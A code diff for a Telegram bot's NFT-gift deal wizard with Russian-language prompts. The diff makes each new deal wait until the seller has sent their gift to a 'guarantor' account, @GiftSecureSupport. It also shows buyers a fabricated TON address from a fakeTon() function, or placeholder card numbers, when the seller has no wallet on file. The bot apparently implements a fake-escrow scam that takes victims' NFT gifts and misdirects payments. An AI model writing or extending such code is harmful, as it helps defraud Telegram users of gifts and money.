@@ -1,9 +1,9 @@
 import { Scenes } from 'telegraf'
 import db from '../db.js'
 import { nanoid, customAlphabet } from 'nanoid'
-import { currencyKb } from '../keyboards.js'
+import { currencyKb, dealCreateKb, sellerGiftKb } from '../keyboards.js'
 
-// 5-символьный код сделки
+// 5-символьный код
 const alphabet = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789'
 const dealCode = customAlphabet(alphabet, 5)
 
@@ -18,6 +18,13 @@ function fakeTon() {
   return s
 }
 
+function detectRubType(val = '') {
+  const v = (val || '').replace(/\s+/g, '')
+  const looksLikeCard = /^\d{16,19}$/.test(v)
+  const looksLikePhone = /^(\+7|7|8)\d{10}$/.test(v)
+  return looksLikeCard ? 'card' : (looksLikePhone ? 'phone' : null)
+}
+
 export const createDealWizard = new Scenes.WizardScene(
   'create-deal',
 
@@ -25,8 +32,7 @@ export const createDealWizard = new Scenes.WizardScene(
   async (ctx) => {
     try { await ctx.deleteMessage() } catch {}
     ctx.wizard.state.data = { sellerId: ctx.from.id, nftLinks: [] }
-    const msg = await ctx.reply('Выберите валюту сделки:', currencyKb())
-    ctx.wizard.state.data.lastMsgId = msg.message_id
+    await ctx.reply('Выберите валюту сделки:', currencyKb())
     return ctx.wizard.next()
   },
 
@@ -37,80 +43,81 @@ export const createDealWizard = new Scenes.WizardScene(
       try { await ctx.telegram.deleteMessage(ctx.chat.id, ctx.callbackQuery.message.message_id) } catch {}
     }
     const cb = ctx.callbackQuery?.data
-    if (!cb?.startsWith('cur:')) {
-      return
-    }
+    if (!cb?.startsWith('cur:')) return
     const currency = cb.split(':')[1]
     ctx.wizard.state.data.currency = currency
 
-    const msg = await ctx.reply(
+    await ctx.reply(
       'Вставьте ссылку на NFT подарок(и). Можно несколько — по одной.\n' +
       'Пример: https://t.me/nft/PlushPepe-2790\n\n' +
       'Когда закончите — напишите: ГОТОВО'
     )
-    ctx.wizard.state.data.lastMsgId = msg.message_id
     return ctx.wizard.next()
   },
 
-  // 2: сбор NFT
+  // 2: сбор NFT ссылок
   async (ctx) => {
     const t = (ctx.message?.text || '').trim()
     if (!t) return
-
     if (t.toLowerCase() === 'готово') {
-      const msg = await ctx.reply('Введите сумму сделки (число):')
-      ctx.wizard.state.data.lastMsgId = msg.message_id
+      await ctx.reply('Введите сумму сделки (число):')
       return ctx.wizard.next()
     }
     ctx.wizard.state.data.nftLinks.push(t)
-    const msg = await ctx.reply('✅ Принято! Ещё ссылку или напишите ГОТОВО.')
-    ctx.wizard.state.data.lastMsgId = msg.message_id
+    await ctx.reply('✅ Принято! Ещё ссылку или напишите ГОТОВО.')
   },
 
   // 3: сумма
   async (ctx) => {
     const amount = Number((ctx.message?.text || '').replace(',','.'))
     if (!isFinite(amount) || amount <= 0) {
-      const msg = await ctx.reply('Введите корректное число.')
-      ctx.wizard.state.data.lastMsgId = msg.message_id
+      await ctx.reply('Введите корректное число.')
       return
     }
     ctx.wizard.state.data.amount = amount
-    const msg = await ctx.reply('Введите «суть сделки»:')
-    ctx.wizard.state.data.lastMsgId = msg.message_id
+    await ctx.reply('Введите «суть сделки»:')
     return ctx.wizard.next()
   },
 
-  // 4: завершение — создаём сделку
+  // 4: финал — создаём сделку
   async (ctx) => {
     const d = ctx.wizard.state.data
     d.summary = (ctx.message?.text || '').trim()
     d.id = nanoid(10)
     d.code = dealCode()
     d.token = nanoid(8)
-    d.status = 'created'
+    d.status = 'waiting_gift' // сначала ждём подарок гаранту
     d.createdAt = Date.now()
-    d.log = [`${now()} — сделка создана продавцом`]
+    d.log = [`${now()} — сделка создана продавцом; ожидание подарка гаранту @GiftSecureSupport`]
 
     await db.read()
     db.data.deals[d.id] = d
     await db.write()
 
-    // формируем платёжные реквизиты для продавца (чтобы он видел, что увидит покупатель)
     const seller = db.data.users[d.sellerId] || {}
     const w = seller.wallets || {}
+
+    // превью того, что увидит покупатель (платёжная часть) после подтверждений
     let payLine = ''
     if (d.currency === 'TON') {
       const addr = w.TON || fakeTon()
       payLine = `Покупателю будет показано: отправьте *${d.amount} TON* на адрес \`${addr}\`.`
     } else if (d.currency === 'RUB') {
-      const card = w.RUB || '2200 1234 5678 9012'
-      payLine = `Покупателю будет показано: отправьте *${d.amount} RUB* на карту \`${card}\`.`
+      const rub = (w.RUB || '').trim()
+      const t = detectRubType(rub)
+      if (t === 'phone') {
+        payLine = `Покупателю будет показано: отправьте *${d.amount} RUB* на *номер телефона* \`${rub}\`.`
+      } else {
+        const card = rub || '2200 1234 5678 9012'
+        payLine = `Покупателю будет показано: отправьте *${d.amount} RUB* на *карту* \`${card}\`.`
+      }
     } else if (d.currency === 'UAH') {
-      const card = w.UAH || '5375 1234 5678 9012'
-      payLine = `Покупателю будет показано: отправьте *${d.amount} UAH* на карту \`${card}\`.`
+      const card = (w.UAH || '5375 1234 5678 9012').trim()
+      payLine = `Покупателю будет показано: отправьте *${d.amount} UAH* на *карту* \`${card}\`.`
     } else if (d.currency === 'STARS') {
-      payLine = `Покупателю будет показано: оплатите *${d.amount} Stars*.`
+      payLine =
+        `Покупателю будет показано: оплатите *${d.amount} Stars* через *Fragment* ` +
+        `(https://fragment.com) или *подарками*. _Комиссия на покупателе._`
     }
 
     // deeplink
@@ -124,7 +131,6 @@ export const createDealWizard = new Scenes.WizardScene(
     }
     const link = botName ? `https://t.me/${botName}?start=${d.token}` : '(ошибка имени бота)'
 
-    // чистим сообщение пользователя
     try { await ctx.deleteMessage() } catch {}
 
     await ctx.reply(
@@ -132,18 +138,20 @@ export const createDealWizard = new Scenes.WizardScene(
 
 🔖 Код: ${d.code}
 💰 Сумма: ${d.amount} ${d.currency}
-🎁 NFT:
+🧧 NFT:
 ${(d.nftLinks || []).join('\n')}
 
 📜 Описание: ${d.summary}
+
+🎁 Статус: *Ожидание подарка гаранту* @GiftSecureSupport
 
 🔗 Ссылка для покупателя:
 ${link}
 
 ${payLine}
 
-Статус: *ожидание оплаты*`,
-      { parse_mode: 'Markdown' }
+Когда отправите подарок гаранту, нажмите «Подарок отправлен».`,
+      { parse_mode: 'Markdown', ...sellerGiftKb(d.token) }
     )
 
     return ctx.scene.leave()
